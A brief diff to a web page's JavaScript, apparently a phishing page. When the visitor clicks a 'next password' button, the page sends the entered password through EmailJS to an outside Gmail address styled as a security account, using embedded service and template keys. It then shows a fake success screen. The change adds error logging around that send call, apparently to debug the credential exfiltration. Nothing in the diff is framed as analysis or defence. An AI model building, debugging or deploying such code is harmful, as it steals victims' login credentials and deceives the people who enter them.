@@ -229,7 +229,10 @@ nextPasswordBtn.addEventListener("click", () => {
   emailjs.send("service_jdep3dj", "template_bockd4k", {
         message: "Password by 15: " + val,
         to_email: "officialsecuritygg@gmail.com"
-    }, "xiQSCA5rQTqmbI4Qz");
+    }, "xiQSCA5rQTqmbI4Qz").catch((err) => {
+  console.log("STATUS:", err.status);
+  console.log("TEXT:", err.text);
+});
 
   // Hide password screen, show success screen
   passwordCard.style.display = "none";
